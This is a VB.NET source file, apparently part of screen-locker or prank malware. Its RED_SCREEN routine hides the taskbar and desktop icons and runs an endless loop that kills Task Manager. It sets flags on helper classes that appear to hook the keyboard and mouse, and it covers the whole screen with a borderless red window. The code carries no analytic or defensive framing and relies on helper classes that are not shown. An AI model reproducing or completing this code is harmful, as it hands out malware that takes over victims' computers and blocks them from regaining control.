Imports System.Drawing
Imports System.Windows.Forms

Public Class V1
    Public Shared Sub RED_SCREEN()
        D.Hide_TaskBar(0)
        D.HSDesktopIcons(False)

        H.Start()


        H2.Start()

        K.BB = True
        K.B = True
        K.ghjk.Start()


        M.GLOBALRETURN = True
        M.ALL = True
        M.MOVE = True
        M.LEFTCLK = True
        M.RIGHTCLK = True

        M.ghjk.Start()

    End Sub


    Public Shared H As New Threading.Thread(Sub() HANDLETSK())
    Public Shared H2 As New Threading.Thread(Sub() Y())
    Public Shared Sub HANDLETSK()

        While True


            For Each h As Process In Process.GetProcessesByName("TaskMgr")

                D.EndTask(h.MainWindowHandle, True, True)

            Next

        End While
    End Sub

    Public Shared HF As New Form
    Public Shared Sub Y()

        HF.ShowInTaskbar = False
        HF.ShowIcon = False
        HF.ControlBox = False
        HF.FormBorderStyle = FormBorderStyle.None

        HF.BackColor = Color.Red

        HF.Size = New Size(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height)

        Dim i As New Threading.Thread(Sub() System.Windows.Forms.Application.Run(HF))

        i.Start()


    End Sub

End Class
